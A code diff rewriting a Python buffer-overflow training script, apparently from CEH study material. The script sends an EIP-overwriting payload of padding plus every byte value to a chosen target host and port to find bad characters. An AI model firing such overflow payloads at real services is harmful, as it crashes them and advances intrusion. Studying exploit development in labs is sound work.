@@ -1,31 +1,193 @@
+#!/usr/bin/env python3
+"""
+Buffer Overflow Bad Character Detection Script
+==============================================
+
+This script helps identify bad characters that get corrupted or filtered
+during buffer overflow exploitation.
+
+Usage: python3 badchars.py <target_ip> <target_port> [--offset <offset>]
+
+Author: CEH Study Guide
+Purpose: Educational - Bad Character Detection
+"""
+
 import sys
 import socket
+import argparse
 
-badchars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
-  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
-  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
-  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
-  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
-  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
-  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
-  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
-  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
-  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
-  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
-  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
-  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
-  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
-  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
-  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+def generate_all_chars(exclude_chars=None):
+    """
+    Generate all possible byte values (0x01-0xFF)
+    
+    Args:
+        exclude_chars (list): List of characters to exclude
+    
+    Returns:
+        bytes: All byte values except excluded ones
+    """
+    if exclude_chars is None:
+        exclude_chars = [0x00]  # Null byte is commonly a bad character
+    
+    all_chars = b""
+    for i in range(1, 256):  # Start from 1 to exclude null byte by default
+        if i not in exclude_chars:
+            all_chars += bytes([i])
+    
+    return all_chars
 
-# Junk = ESP+EBP +  EIP  + badchars
-junk  = "A"*1052 + "B"*4 + badchars
-# Establish Connection and Send Junk
-try:
-	conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-	conn.connect(("127.0.0.1",8888))
-	conn.send(junk)
-	conn.close()
-	sys.exit()
-except Exception as error:
-	print("Error Occur " + error)
+def create_badchar_payload(offset, return_address, badchars):
+    """
+    Create payload with potential bad characters
+    
+    Args:
+        offset (int): Offset to EIP
+        return_address (bytes): Address to overwrite EIP with
+        badchars (bytes): Bad character sequence to test
+    
+    Returns:
+        bytes: Complete payload
+    """
+    junk = b"A" * offset
+    eip = return_address
+    payload = junk + eip + badchars
+    
+    return payload
+
+def send_badchar_payload(target_ip, target_port, payload, timeout=5):
+    """
+    Send bad character payload to target
+    
+    Args:
+        target_ip (str): Target IP address
+        target_port (int): Target port number
+        payload (bytes): Payload to send
+        timeout (int): Connection timeout
+    
+    Returns:
+        bool: True if sent successfully
+    """
+    try:
+        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        conn.settimeout(timeout)
+        conn.connect((target_ip, target_port))
+        conn.send(payload)
+        conn.close()
+        return True
+        
+    except Exception as e:
+        print(f"[-] Connection error: {e}")
+        return False
+
+def print_char_array(chars, chars_per_line=16):
+    """
+    Print character array in hex format
+    
+    Args:
+        chars (bytes): Character array to print
+        chars_per_line (int): Characters per line
+    """
+    print("[+] Character array:")
+    for i in range(0, len(chars), chars_per_line):
+        line = chars[i:i+chars_per_line]
+        hex_values = " ".join(f"\\x{b:02x}" for b in line)
+        print(f"    {hex_values}")
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="Buffer Overflow Bad Character Detection Tool",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  # Send all characters for testing
+  python3 badchars.py 192.168.1.100 9999 --offset 1052
+  
+  # Exclude specific characters
+  python3 badchars.py 192.168.1.100 9999 --offset 1052 --exclude 0x00 0x0a 0x0d
+  
+  # Custom EIP value
+  python3 badchars.py 192.168.1.100 9999 --offset 1052 --eip "\\x42\\x42\\x42\\x42"
+  
+Steps:
+  1. Send payload with all possible characters
+  2. Check memory/registers in debugger for corruption
+  3. Identify corrupted characters and exclude them
+  4. Repeat until no characters are corrupted
+        """
+    )
+    
+    parser.add_argument('target_ip', help='Target IP address')
+    parser.add_argument('target_port', type=int, help='Target port number')
+    parser.add_argument('--offset', type=int, default=1052,
+                       help='EIP offset (default: 1052)')
+    parser.add_argument('--eip', default="\\x42\\x42\\x42\\x42",
+                       help='EIP value in hex format (default: BBBB)')
+    parser.add_argument('--exclude', nargs='+', default=['0x00'],
+                       help='Characters to exclude (hex format)')
+    parser.add_argument('--generate-only', action='store_true',
+                       help='Only generate and display character array')
+    
+    args = parser.parse_args()
+    
+    # Parse excluded characters
+    exclude_chars = []
+    for char in args.exclude:
+        try:
+            if char.startswith('0x'):
+                exclude_chars.append(int(char, 16))
+            else:
+                exclude_chars.append(int(char))
+        except ValueError:
+            print(f"[-] Invalid character format: {char}")
+            return
+    
+    # Parse EIP value
+    try:
+        eip_bytes = bytes(args.eip.replace('\\x', '').decode('hex'))
+    except:
+        # Alternative parsing for modern Python
+        eip_str = args.eip.replace('\\x', '')
+        if len(eip_str) % 2 != 0:
+            print("[-] Invalid EIP format. Use format like \\x42\\x42\\x42\\x42")
+            return
+        eip_bytes = bytes.fromhex(eip_str)
+    
+    # Generate character array
+    badchars = generate_all_chars(exclude_chars)
+    
+    print(f"[+] Generating bad character array ({len(badchars)} characters)")
+    print(f"[+] Excluded characters: {[hex(c) for c in exclude_chars]}")
+    
+    if args.generate_only:
+        print_char_array(badchars)
+        return
+    
+    # Create and send payload
+    payload = create_badchar_payload(args.offset, eip_bytes, badchars)
+    
+    print(f"[+] Target: {args.target_ip}:{args.target_port}")
+    print(f"[+] EIP Offset: {args.offset}")
+    print(f"[+] EIP Value: {args.eip}")
+    print(f"[+] Payload size: {len(payload)} bytes")
+    
+    print_char_array(badchars)
+    
+    print(f"\n[*] Sending bad character payload...")
+    
+    if send_badchar_payload(args.target_ip, args.target_port, payload):
+        print(f"[+] Payload sent successfully!")
+        print(f"[*] Check debugger/memory dump for corrupted characters")
+        print(f"[*] Look for missing or altered bytes in the character sequence")
+        print(f"[*] Common bad characters: \\x00 (null), \\x0a (LF), \\x0d (CR), \\x20 (space)")
+    else:
+        print(f"[-] Failed to send payload")
+
+if __name__ == "__main__":
+    main()
+
+# Common bad characters to watch for:
+# \x00 - Null byte (string terminator)
+# \x0A - Line Feed (LF)
+# \x0D - Carriage Return (CR)
+# \x20 - Space character
+# \xFF - May be filtered by some applications
